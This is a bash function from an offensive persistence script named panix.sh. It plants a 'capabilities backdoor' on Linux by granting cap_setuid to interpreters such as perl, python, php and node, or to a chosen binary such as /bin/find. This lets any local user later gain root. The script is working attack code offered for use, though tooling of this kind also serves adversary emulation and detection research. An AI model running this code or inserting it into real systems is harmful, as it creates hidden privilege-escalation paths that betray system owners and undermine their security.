setup_cap_backdoor() {
	local default=0
	local custom=0
	local capability=""
	local binary=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_cap_backdoor() {
		echo "Usage: ./panix.sh --cap [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default capabilities settings"
		echo "--custom                     Use custom capabilities settings"
		echo "  --capability <capability>    Specify the capability"
		echo "  --binary <binary>            Specify the path to the binary"
        echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--capability )
				shift
				capability=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --cap --default"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --cap --custom --capability \"cap_setuid+ep\" --binary \"/bin/find\""
				exit 0
				;;
			--help|-h)
				usage_cap_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --cap: $1"
				echo "Try './panix.sh --cap --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --cap --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --cap --help' for more information."
		exit 1
	fi

	# Ensure setcap is found
	if ! command -v setcap &>/dev/null; then
		if [[ -x /sbin/setcap ]]; then
			SETCAP="/sbin/setcap"
		else
			echo "[-] setcap not found. Ensure the 'libcap2-bin' package is installed."
			exit 1
		fi
	else
		SETCAP=$(command -v setcap)
	fi

	if [[ $default -eq 1 ]]; then
		local binaries=("perl" "ruby" "php" "python" "python3" "node")

		for bin in "${binaries[@]}"; do
			if command -v $bin &> /dev/null; then
				local path=$(command -v $bin)
				# Resolve symbolic links to get the real path
				path=$(realpath $path)
				$SETCAP cap_setuid+ep "$path"
				if [[ $? -eq 0 ]]; then
					echo "[+] Capability setuid granted to $path"
				else
					echo "[-] Failed to grant capability setuid to $path"
				fi
			else
				echo "[-] $bin is not present on the system."
			fi
		done
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $capability || -z $binary ]]; then
			echo "Error: --capability and --binary must be specified with --custom."
			echo "Try './panix.sh --cap --help' for more information."
			exit 1
		fi

		if command -v $binary &> /dev/null; then
			local path=$(command -v $binary)
			# Resolve symbolic links to get the real path
			path=$(realpath $path)
			$SETCAP $capability $path
			if [[ $? -eq 0 ]]; then
				echo "[+] Capability $capability granted to $path"
			else
				echo "[-] Failed to grant capability $capability to $path"
			fi
		else
			echo "[-] $binary is not present on the system."
		fi
	fi
	echo "[+] Capabilities backdoor persistence established!"
}
